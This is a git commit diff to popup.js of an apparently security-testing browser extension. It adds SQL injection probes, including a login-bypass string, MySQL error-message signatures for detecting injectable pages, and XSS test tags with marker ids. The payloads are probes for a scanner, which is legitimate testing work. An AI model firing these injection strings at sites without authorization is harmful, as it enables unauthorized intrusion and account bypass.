98eeba0ce956956f62a4d89573c8b5135ee8c7d3
newbishme <bluedabedi@hotmail.com>
2014-07-27 16:22:47 +0800

    Payload updated
    Some XSS payload result turn out uncertain, not sure why; need to
    recheck

--- QY-Ext/popup.js
+++ QY-Ext/popup.js
@@ -261,23 +261,47 @@ $(function() {
 var payload2 = [ 
     ["sql", "Test for vulnerability", "sql1",
      [["*","';--"]],
-     ["An error occured: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to","error"]
+     ["An error occured: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to"
+     ,"You have an error in your SQL syntax;"
+     ,"You have an error in your SQL syntax near"
+     ,"MySQL server version for the right syntax to use"
+     ,"Unknown MySQL error","An error occured: "
+     ,"valid MySQL result"
+     ,"on MySQL result index","Column count doesn't match value count at row"
+     ,"Column count doesn't match"
+     ,"supplied argument is not a valid MySQL"
+     ,"Warning.*mysql_.*"]
     ],
     ["sql", "Login Field","sql2",
      [["^.*username.*$","' or '1' = '1"]]
     ],
     ["xss", "Test for vulnerability","xss1",
-     [["*","<div id='w1232' href='w1232' src='w1232'></div>"]],
-     ["@XSS,w1232,href,src"]
+     [["*","<div id='w1231' href='w1231' src='w1231'></div>"]],
+     ["@XSS,w1231,href,src"]
     ],
     ["xss", "Insert Image","xss2",
-     [["*",""]]
+     [["*","<IMG id=w1232 src=w1232> "]],
+     ["@XSS,w1232,src"]
     ],
     ["xss", "Insert Script","xss3",
-     [["*",""]]
+     [["*","<script id=w1233 src=w1233>"]],
+     ["@XSS,w1233,src"]
     ],
-    ["xss", "Insert Redirection","xss4",
-     [["*",""]]
+    ["xss", "Insert IFRAME","xss4",
+     [["*","<iframe id=w1234 src=w1234 onload=w1234 onmouseover=w1234>"]],
+     ["@XSS,w1234,src,onload,onmouseover"]
+    ],
+    ["xss", "Insert IFRAME (Open ended tag)","xss5",
+     [["*","<iframe id=w1235 src=w1234 onload=w1235 onmouseover=w1235"]],
+     ["@XSS,w1235,src,onload,onmouseover"]
+    ],
+    ["xss", "Insert BODY","xss6",
+     [["*","<body id=w1236 background=w1236 onload=w1236>"]],
+     ["@XSS,w1236,background,onload"]
+    ],
+    ["xss", "Insert LINK Stylesheet","xss7",
+     [["*","<link id=w1237 rel=stylesheet href=w1237>"]],
+     ["@XSS,w1237,rel,href"]
     ]
 
 ];
@@ -285,24 +309,48 @@ var payload2 = [
 
 var payload = [ 
     ["sql", "Test for vulnerability", "sql1",
-     [["*","';--"],["*","'--"]],
-     ["An error occured: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to","error"]
+     [["*","';--"],["*","'--"],["*","1'1"], ["*", "1\'"], ["*","a\'"], ["*","98765432\'"], ["*","5432\'"], ["*",";"]],
+     ["An error occured: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to"
+     ,"You have an error in your SQL syntax;"
+     ,"You have an error in your SQL syntax near"
+     ,"MySQL server version for the right syntax to use"
+     ,"Unknown MySQL error","An error occured: "
+     ,"valid MySQL result"
+     ,"on MySQL result index","Column count doesn't match value count at row"
+     ,"Column count doesn't match"
+     ,"supplied argument is not a valid MySQL"
+     ,"Warning.*mysql_.*"]
     ],
     ["sql", "Login Field","sql2",
      [["^.*username.*$","' or '1' = '1"]]
     ],
     ["xss", "Test for vulnerability","xss1",
-     [["*","<div id='w1232' href='w1232' src='w1232'></div>"]],
-     ["@XSS,w1232,href,src"]
+     [["*","<div id='w1231' href='w1231' src='w1231'></div>"]],
+     ["@XSS,w1231,href,src"]
     ],
     ["xss", "Insert Image","xss2",
-     [["*",""]]
+     [["*","<IMG id=w1232 src=w1232> "]],
+     ["@XSS,w1232,src"]
     ],
     ["xss", "Insert Script","xss3",
-     [["*",""]]
+     [["*","<script id=w1233 src=w1233>"]],
+     ["@XSS,w1233,src"]
     ],
-    ["xss", "Insert Redirection","xss4",
-     [["*",""]]
+    ["xss", "Insert IFRAME","xss4",
+     [["*","<iframe id=w1234 src=w1234 onload=w1234 onmouseover=w1234>"]],
+     ["@XSS,w1234,src,onload,onmouseover"]
+    ],
+    ["xss", "Insert IFRAME (Open ended tag)","xss5",
+     [["*","<iframe id=w1235 src=w1234 onload=w1235 onmouseover=w1235"]],
+     ["@XSS,w1235,src,onload,onmouseover"]
+    ],
+    ["xss", "Insert BODY","xss6",
+     [["*","<body id=w1236 background=w1236 onload=w1236>"]],
+     ["@XSS,w1236,background,onload"]
+    ],
+    ["xss", "Insert LINK Stylesheet","xss7",
+     [["*","<link id=w1237 rel=stylesheet href=w1237>"]],
+     ["@XSS,w1237,rel,href"]
     ],
     ["xsrf", "Test for vulnerability", "xsrf1",
      [["z{1000}",""]],
